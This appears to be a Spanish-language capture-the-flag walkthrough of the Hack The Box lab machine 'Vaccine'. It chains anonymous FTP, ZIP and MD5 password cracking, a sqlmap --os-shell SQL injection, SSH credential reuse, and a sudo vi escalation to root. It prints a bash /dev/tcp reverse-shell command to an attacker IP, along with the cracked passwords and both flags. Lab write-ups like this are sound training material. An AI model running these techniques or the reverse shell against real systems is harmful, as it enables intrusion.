
# HTB - Vaccine

## Machine Information

| Information          | Value                 |
| -------------------- | --------------------- |
| Machine              | Vaccine               |
| IP                   | 10.129.11.148         |
| OS                   | Linux                 |
| Difficulty           | Easy                  |
| Initial Access       | FTP / Web Application |
| Privilege Escalation | Sudo `vi`             |
| Final User           | root                  |

# 1. Reconocimiento

Comenzamos realizando un escaneo de puertos con Nmap para identificar los servicios expuestos por la máquina.

Durante la enumeración encontramos que FTP está abierto y permite conexiones anónimas.

El servicio FTP es especialmente interesante porque el acceso como `anonymous` puede permitir descargar archivos sin necesidad de disponer inicialmente de credenciales.

# 2. Enumeración FTP

Nos conectamos al servicio FTP utilizando el usuario `anonymous`:

```bash id="p6x4vn"
ftp 10.129.11.148
```

El servidor permite autenticarnos sin proporcionar una contraseña válida.

Una vez dentro, listamos los archivos disponibles:

```text id="r8c2mf"
ftp> ls
```

Encontramos un archivo llamado:

```text id="u1q7az"
backup.zip
```

Lo descargamos utilizando:

```text id="j5v9kc"
ftp> get backup.zip
```

Ahora tenemos `backup.zip` en nuestra máquina atacante.

# 3. Cracking del ZIP

Al intentar abrir el archivo ZIP descubrimos que está protegido mediante contraseña.

En lugar de intentar adivinar directamente la contraseña, podemos extraer el hash utilizado por el archivo ZIP y posteriormente utilizar John the Ripper para realizar el cracking.

Primero utilizamos `zip2john`:

```bash id="x3m7qp"
zip2john backup.zip > hash.txt
```

Esto genera un archivo con la información necesaria para que John the Ripper pueda intentar recuperar la contraseña.

Después utilizamos la wordlist `rockyou.txt`:

```bash id="n8d4tw"
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Una vez terminado el proceso, podemos comprobar la contraseña encontrada mediante:

```bash id="q2v6ks"
john hash.txt --show
```

Con esto obtenemos la contraseña utilizada para proteger el archivo ZIP.

# 4. Enumeración del Backup

Abrimos el archivo utilizando la contraseña obtenida.

Dentro del ZIP encontramos información adicional que resulta útil para continuar con la explotación.

Entre los datos encontrados aparece una contraseña almacenada como un hash MD5.

Para identificar el tipo de hash podemos utilizar:

```bash id="a7j3sx"
hash-identifier
```

El resultado nos permite identificarlo como MD5.

Como se trata de un hash de una contraseña relativamente sencilla, podemos utilizar un servicio de cracking como CrackStation.

[CrackStation](https://crackstation.net/?utm_source=chatgpt.com)

El resultado obtenido es:

```text id="c9f2lm"
qwerty789
```

Esta contraseña será utilizada posteriormente para autenticarnos contra la aplicación web.

# 5. Enumeración Web

Con las credenciales obtenidas accedemos a la aplicación web.

La aplicación está disponible mediante HTTP.

Uno de los endpoints encontrados es:

```text id="v5k8rx"
http://10.129.11.148/dashboard.php?search=nothing
```

El parámetro:

```text id="q4m1bz"
search
```

resulta especialmente interesante porque recibe directamente información controlada por el usuario.

Por lo tanto, comenzamos a investigar si el parámetro es vulnerable a SQL Injection.

# 6. SQL Injection

Utilizamos SQLMap para automatizar la detección y explotación de la vulnerabilidad.

Debido a que la aplicación requiere una sesión autenticada, incluimos nuestra cookie `PHPSESSID`:

```bash id="z6c3pq"
sqlmap -u 'http://10.129.11.148/dashboard.php?search=nothing' --cookie="PHPSESSID=maim3ekuus8h4v8i1js12oppjo" --os-shell
```

Los argumentos importantes son:

```text id="w2n8fd"
-u
```

Especifica la URL objetivo.

```text id="g5r9kc"
--cookie
```

Permite enviar la cookie de sesión necesaria para interactuar con la aplicación autenticada.

```text id="h7x1mv"
--os-shell
```

Le indica a SQLMap que, si las condiciones lo permiten, intente obtener una shell del sistema operativo mediante la SQL Injection.

La vulnerabilidad nos permite pasar de una SQL Injection a ejecución de comandos en el sistema.

# 7. Obtención de Credenciales del Sistema

Una vez obtenemos acceso mediante el `os-shell`, comenzamos a enumerar los archivos de la aplicación.

La aplicación web se encuentra en:

```text id="m3c8qa"
/var/www/html
```

Durante la enumeración revisamos archivos PHP, especialmente `index.php`, buscando credenciales o información sensible.

Encontramos las credenciales de PostgreSQL:

```text id="r7x2np"
user=postgres
password=P@s5w0rd!
```

La contraseña puede ser reutilizada para acceder directamente al sistema mediante SSH.

# 8. Acceso mediante SSH

Como SSH está habilitado en la máquina, utilizamos las credenciales encontradas:

```bash id="d4k9sv"
ssh postgres@10.129.11.148
```

Introducimos:

```text id="p8w3lm"
Password: P@s5w0rd!
```

Obtenemos una shell como:

```text id="n2j6xc"
postgres
```

# 9. User Flag

Una vez dentro del sistema podemos buscar la flag del usuario.

La flag obtenida es:

```text id="u5r8bz"
ec9b13ca4d6229cd5cc1e09980965bf7
```

# 10. Reverse Shell

Aunque ya tenemos acceso mediante SSH, podemos establecer una reverse shell para obtener una terminal más cómoda para continuar con la enumeración.

Desde el `os-shell` utilizamos:

```bash id="k3v7qp"
bash -c 'bash -i >& /dev/tcp/10.10.14.141/4444 0>&1'
```

Antes de ejecutar el comando iniciamos nuestro listener:

```bash id="s9m2fd"
nc -lvnp 4444
```

Al recibir la conexión obtenemos una shell interactiva en nuestra máquina atacante.

# 11. Enumeración de Privilegios

Ahora comprobamos los grupos y privilegios del usuario:

```bash id="f8x4mc"
id
```

Posteriormente revisamos los comandos que podemos ejecutar mediante `sudo`:

```bash id="v2q7zn"
sudo -l
```

Encontramos:

```text id="c6m9rx"
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Esto significa que el usuario `postgres` puede ejecutar `/bin/vi` como cualquier usuario, incluyendo `root`.

El problema no está necesariamente en el archivo `pg_hba.conf`, sino en que `vi` es un editor que permite ejecutar comandos del sistema.

Por lo tanto, tenemos una vía directa para ejecutar comandos como `root`.

# 12. Privilege Escalation mediante vi

Ejecutamos:

```bash id="y4p8ks"
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Se abre `vi` con privilegios de `root`.

Desde el editor podemos ejecutar un comando del sistema utilizando:

```text id="r9v3tw"
:!/bin/bash
```

La secuencia:

```text id="m6x2qa"
:
```

abre el modo de comandos de `vi`.

El operador:

```text id="j8k4pd"
!
```

permite ejecutar un comando externo.

Finalmente:

```text id="s3n7vx"
/bin/bash
```

ejecuta Bash.

Como `vi` fue iniciado mediante `sudo`, el proceso se ejecuta con privilegios de `root`.

Comprobamos nuestro usuario:

```bash id="w5c1mz"
whoami
```

Resultado:

```text id="a7q9lx"
root
```

Hemos conseguido escalar privilegios.

# 13. Root Flag

Ahora podemos acceder al directorio `/root`:

```bash id="h2m6rc"
cd /root
```

y leer la flag:

```bash id="k8v4sp"
cat root.txt
```

Resultado:

```text id="z1q7nd"
dd6e058e814260bc70e9bbdef2715849
```

La `root flag` es:

```text id="b4m9xc"
dd6e058e814260bc70e9bbdef2715849
```

# 14. Flags

```text id="p7r3vw"
User flag:
ec9b13ca4d6229cd5cc1e09980965bf7

Root flag:
dd6e058e814260bc70e9bbdef2715849
```

# 15. Attack Path

```text id="q6n2za"
FTP
    |
Anonymous Login
    |
backup.zip
    |
zip2john
    |
John the Ripper
    |
ZIP Password
    |
MD5 Hash
    |
CrackStation
    |
qwerty789
    |
Web Application
    |
SQL Injection
    |
SQLMap
    |
OS Shell
    |
/var/www/html
    |
PostgreSQL Credentials
    |
SSH
    |
postgres
    |
sudo -l
    |
/bin/vi
    |
:!/bin/bash
    |
root
    |
Root Flag
```

# 16. Vulnerabilities & Techniques

* Anonymous FTP Access
* Sensitive File Disclosure
* Password-Protected ZIP
* ZIP Hash Extraction with `zip2john`
* Password Cracking with John the Ripper
* MD5 Hash Identification
* Offline Password Cracking
* Web Application Enumeration
* SQL Injection
* SQLMap
* OS Command Execution
* Sensitive Information Disclosure
* Plaintext Database Credentials
* Credential Reuse
* SSH Authentication
* Sudo Misconfiguration
* Privileged `vi` Execution
* Command Execution through `vi`
* Privilege Escalation to root

# 17. Lessons Learned

Vaccine es una máquina que conecta varias técnicas diferentes en una cadena bastante clara.

El primer acceso no viene directamente de la aplicación web. Primero encontramos un servicio FTP que permite autenticación anónima y nos permite descargar `backup.zip`.

Después tenemos que encadenar dos procesos de cracking:

```text id="e4c8ny"
backup.zip
    |
zip2john
    |
John the Ripper
    |
ZIP Password
    |
MD5
    |
CrackStation
    |
qwerty789
```

La contraseña obtenida nos permite acceder a la aplicación web.

Posteriormente encontramos una SQL Injection en el parámetro `search`. SQLMap permite automatizar la explotación y conseguir un `os-shell`.

Desde este acceso podemos revisar el código de la aplicación y encontrar credenciales de PostgreSQL:

```text id="n7x2km"
postgres / P@s5w0rd!
```

Como SSH está habilitado, reutilizamos esas credenciales para conseguir acceso como `postgres`.

La parte más importante de la escalada consiste en revisar:

```bash id="c9v4bz"
sudo -l
```

Encontramos que podemos ejecutar:

```text id="1f8mqp"
/bin/vi /etc/postgresql/11/main/pg_hba.conf
```

como cualquier usuario.

Esto es suficiente para conseguir `root`, porque `vi` permite ejecutar comandos externos mediante:

```text id="d5q7ws"
:!/bin/bash
```

La lección principal es que cuando `sudo -l` nos permite ejecutar un editor como `root`, debemos comprobar si ese editor tiene alguna funcionalidad que permita ejecutar comandos del sistema.

En esta máquina, la cadena completa fue:

```text id="t8m3xr"
Anonymous FTP
    |
Credential Cracking
    |
Web Application
    |
SQL Injection
    |
OS Shell
    |
Credential Disclosure
    |
SSH
    |
postgres
    |
sudo vi
    |
root
```

pwned :)))))
